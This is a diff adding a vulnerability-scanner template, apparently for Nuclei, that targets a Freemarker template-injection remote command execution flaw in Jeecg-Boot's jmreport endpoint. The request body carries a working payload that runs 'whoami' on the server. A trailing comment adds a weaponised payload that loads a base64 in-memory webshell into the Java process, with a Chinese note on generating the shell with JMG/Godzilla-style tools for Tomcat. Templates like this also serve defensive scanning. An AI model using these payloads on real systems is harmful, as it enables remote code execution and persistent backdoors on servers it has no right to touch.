@@ -1,0 +1,27 @@
+id: jeecg-boot-ssti-rce
+
+info:
+  name: Jeecg-Boot SSTI 远程命令执行
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Jeecg-Boot Freemarker 模版注入漏洞
+  metadata:
+  tags: jeecg
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,"解析成功") && contains(body_1,"fieldList") && contains(body_1,"fieldText")
+        condition: and
+#{"sql":"call${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='这里填入base64的内存马';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\")}","dbSource":"","type":"0"}
+#使用JMG内存马工具生成payload，将生成的base64格式的内存马 替换payload 中bytecodeBase64的值。工具类似：godzilla  中间件/框架；tomcat 
